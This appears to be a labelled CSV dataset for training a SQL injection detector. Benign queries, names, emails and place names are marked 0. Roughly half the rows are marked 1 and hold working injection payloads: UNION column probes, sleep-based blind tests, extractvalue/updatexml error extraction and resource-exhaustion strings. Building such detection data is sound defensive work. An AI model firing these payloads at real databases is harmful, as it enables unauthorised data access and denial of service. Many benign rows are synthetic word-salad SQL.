Query,Label
blenkarn6,0
"c/ meneses, 104 6-a",0
rebalg1r,0
SELECT earth ( s FROM national RIGHT JOIN,0
"1' ) union all select null,null,null,null#",1
"1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and 'tuzl' = 'tuzl",1
SELECT * FROM saved WHERE best BETWEEN '1996-07-01' AND '1996-07-31',0
"-4606"" ) as elek where 8261 = 8261 or 8571 = 8571--",1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""vfvh"" = ""vfvh",1
-3246%' union all select 4012#,1
renan1@fichajes.nom.sd,0
"prat de llobregat, el",0
1' ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( 'ltki' = 'ltki,1
"-3829%"" ) union all select 2218,2218,2218,2218,2218,2218,2218--",1
"-7764"" or 7308 = 7805",1
"1 ) ) as zmsa where 6909 = 6909 union all select null,null,null,null,null,null,null#",1
SELECT anywhere ( s ) FROM youth SELECT got ( s ),0
"-3697' ) ) ) union all select 5180,5180,5180,5180,5180,5180,5180--",1
973,0
SELECT blind FROM egg UNION ALL SELECT half FROM closer ORDER BY sheet,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 289969 ) ORDER BY meta_id ASC",0
SELECT * FROM level WHERE sport BETWEEN satellites09/01/1996modern AND fill15/31/1996opportunity,0
SELECT DISTINCT myself FROM storm,0
"INSERT INTO which ( mile, friend, finish, monkey, word, then ) VALUES ( 'against', 'recently'. gray', 'sum', 'stock', 'fastened', 'go' )",0
"-9565"" where 1616 = 1616 union all select 1616,1616,1616,1616--",1
SELECT * FROM mainly FETCH FIRST 50 PERCENT ROWS ONLY,0
"-4379' union all select 1648,1648,1648,1648,1648,1648,1648#",1
"1"" ) where 9570 = 9570 rlike ( select ( case when ( 1642 = 3686 ) then 1 else 0x28 end ) ) --",1
"1%' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( '%' = '",1
koczian@decoaching.is,0
"1' in boolean mode ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) #",1
1' where 5455 = 5455 and sleep ( 5 ) --,1
SELECT town ( s ) FROM whom UNION,0
SELECT * FROM birthday WHERE all = 'party' LIMIT 3,0
x' and userid is NULL; --,1
SELECT * FROM badly WHERE won = 'red' FETCH FIRST 3 ROWS ONLY,0
SELECT AVG ( till ) FROM practical,0
"-5139 ) ) union all select 3373,3373,3373,3373,3373,3373,3373,3373#",1
1 ) ) ) and ( 6148 = 3343 ) *3343 and ( ( ( 3271 = 3271,1
SELECT youth ( s ) FROM tape UNION,0
"1%' ) and elt ( 4249 = 4249,7259 ) and ( '%' = '",1
puente la reina/gares,0
1 where 1299 = 1299,1
1'|| ( select 'kptj' from dual where 5123 = 5123,1
"1%"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ""%"" = """,1
"1' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'isyg' = 'isyg",1
1' ) as ghvi where 3880 = 3880 and 4595 = 4595#,1
1 ) as eryo where 2531 = 2531 rlike sleep ( 5 ) --,1
SELECT * FROM he WHERE jungle BETWEEN 'cup' AND 'could',0
SELECT COUNT ( improve ) FROM control,0
"1"" ) as jtou where 8129 = 8129 and 7533 = 7533--",1
1' rlike sleep ( 5 ) and 'gtfo' = 'gtfo,1
"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1
"SELECT shoutID AS ID, provide AS student FROM harder",0
1%' ) ) and 4595 = 4595#,1
"1, ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select 1 from generate_series ( 8979,8979,case when ( 8979 = 8979 ) then 1 else 0 end ) limit 1 ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",1
1 ) as bhdj where 4472 = 4472,1
"SELECT * FROM visitor WHERE mistake BETWEEN ""apart"" AND ""unknown""",0
"1%' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( '%' = '",1
navratil@sindns.as,0
"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'lqql' = 'lqql",1
1 ) where 9344 = 9344,1
"SELECT Employees.grade, COUNT ( Orders.fineID ) AS chemicalFROM ( OrdersINNER JOIN growth ON Orders.thenID = Employees.aloneID )",0
1' ) where 5214 = 5214,1
